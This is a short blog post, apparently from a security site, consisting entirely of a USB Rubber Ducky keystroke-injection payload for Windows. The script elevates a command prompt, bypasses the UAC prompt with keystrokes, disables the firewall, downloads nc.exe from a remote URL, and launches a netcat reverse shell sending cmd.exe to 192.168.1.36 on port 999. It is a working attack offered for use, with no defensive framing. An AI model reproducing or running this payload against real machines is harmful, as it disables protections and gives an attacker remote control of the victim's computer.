# Payload Netcat download and reverse shell
## Ducky scripts, PowerShell, Security 
### URL: https://www.jesusninoc.com/2015/02/19/payload-netcat-download-and-reverse-shell/
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2050
ALT s
DELAY 2050
ENTER
STRING netsh firewall set opmode disable
ENTER
DELAY 100
STRING powershell Start-BitsTransfer -Source 'https://www.jesusninoc.com/wp-content/uploads/2015/02/nc.exe' -Destination $env:TEMP\nc.exe;
ENTER
DELAY 100
GUI r
DELAY 2050
STRING powershell cd $env:TEMP; .\nc.exe 192.168.1.36 999 -e cmd.exe -d
ENTER

```
